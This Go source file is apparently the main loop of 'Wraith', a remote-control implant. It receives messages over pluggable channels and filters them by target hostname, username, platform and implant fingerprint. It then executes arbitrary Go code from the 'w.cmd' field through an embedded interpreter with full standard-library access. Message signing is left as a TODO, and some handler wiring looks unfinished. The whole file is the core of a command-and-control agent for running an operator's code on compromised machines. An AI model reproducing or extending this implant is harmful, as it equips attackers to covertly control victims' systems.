package main

import (
	"fmt"
	"os"
	"os/signal"
	"os/user"
	"regexp"
	"runtime"
	"syscall"
	"time"

	"github.com/0x1a8510f2/wraith/comms"
	"github.com/0x1a8510f2/wraith/comms/translator"
	"github.com/0x1a8510f2/wraith/config"
	"github.com/0x1a8510f2/wraith/hooks"

	_ "github.com/0x1a8510f2/wraith/comms/channels/rx"
	_ "github.com/0x1a8510f2/wraith/comms/channels/tx"

	"github.com/traefik/yaegi/interp"
	"github.com/traefik/yaegi/stdlib"
)

// Useful globals
var startTime time.Time

// Exit handling
var exitTrigger chan struct{}

func setupCloseHandler() {
	c := make(chan os.Signal)
	signal.Notify(
		c,
		syscall.SIGHUP,
		syscall.SIGINT,
		syscall.SIGQUIT,
		syscall.SIGTERM,
	)
	go func() {
		<-c
		if config.Config.Process.RespectExitSignals {
			exitTrigger <- struct{}{}
		}
	}()
}

func init() {
	startTime = time.Now()
	exitTrigger = make(chan struct{})
	setupCloseHandler()
}

func main() {
	// Run OnStart hooks
	hooks.RunOnStart()

	// Run OnExit hooks always on exit
	defer hooks.RunOnExit()

	// Hook up command handler to OnRx event
	hooks.OnRx.Add(func(data map[string]interface{}) (result string) {
		// Always catch panics from this function as no error here should crash Wraith
		defer func() {
			if r := recover(); r != nil {
				result = fmt.Sprintf("command execution panicked with message: %s", r)
			}
		}()

		if cmd, ok := data["w.cmd"]; ok {
			// Initialise yaegi to handle commands
			i := interp.New(interp.Options{})
			i.Use(stdlib.Symbols)
			// The code should generate a function called "wcmd" to be executed by Wraith.
			// That function should in turn return a string to be used as the result.
			// If the value of the key cmd is not a string, the panic will be caught and
			// returned as the command result.
			_, err := i.Eval(cmd.(string))
			if err != nil {
				panic(err)
			}
			fnv, err := i.Eval("wcmd")
			if err != nil {
				panic(err)
			}
			fn, ok := fnv.Interface().(func() string)
			if !ok {
				panic("wcmd is not a `func() string`")
			}
			result = fn()
		}
		return
	})

	// Mainloop: Transmit, receive and process stuff
	for {
		// TODO: Find what is concurrent and what is not to catch points where Wraith can break/stall
		select {
		case rx := <-comms.UnifiedRxQueue:
			// Attempt to translate data from any known format to a map[string]interface{}
			data, err := translator.DecodeGuess(rx.Data)
			if err != nil {
				// The data failed to decode (most likely didn't match any known format) so it should be discarded
				break
			}

			// Data should now be a map[string]interface{}
			// Some data should be verified to avoid processing data which should not be processed:

			// TODO: Check if data is signed

			// Check if the data has validity constraints and if they are satisfied
			if validity, ok := data["w.validity"]; ok {
				if validity, ok := validity.(map[string]string); ok {
					// Enforce validity constraints

					// Wraith Fingerprint/ID restriction
					if constraint, ok := validity["wfpt"]; ok {
						// Always fail if an ID restriction is present and Wraith has not been given an ID
						if config.Config.Wraith.Fingerprint == "" {
							break
						}
						match, err := regexp.Match(constraint, []byte(config.Config.Wraith.Fingerprint))
						if !match || err != nil {
							// If the constraint was not satisfied, the data should be dropped
							// If there was an error in checking the match, Wraith will fallback to fail
							// as to avoid running erroneous commands on every Wraith.
							break
						}
					}

					// Host Fingerprint/ID restriction
					if constraint, ok := validity["hfpt"]; ok {
						match, err := regexp.Match(constraint, []byte{}) // TODO
						if !match || err != nil {
							break
						}
					}

					// Hostname restriction
					if constraint, ok := validity["hnme"]; ok {
						hostname, err := os.Hostname()
						if err != nil {
							// Always fail if hostname could not be checked
							break
						}
						match, err := regexp.Match(constraint, []byte(hostname))
						if !match || err != nil {
							break
						}
					}

					// Running username restriction
					if constraint, ok := validity["rusr"]; ok {
						user, err := user.Current()
						if err != nil {
							break
						}
						match, err := regexp.Match(constraint, []byte(user.Username))
						if !match || err != nil {
							break
						}
					}

					// Platform (os/arch) restriction
					if constraint, ok := validity["plfm"]; ok {
						platform := fmt.Sprintf("%s|%s", runtime.GOOS, runtime.GOARCH)
						match, err := regexp.Match(constraint, []byte(platform))
						if !match || err != nil {
							break
						}
					}
				}
			}
			// When data is received, run the OnRx handlers
			hooks.RunOnRx(map[string]interface{}{})
		case <-exitTrigger:
			return
		}
	}

}
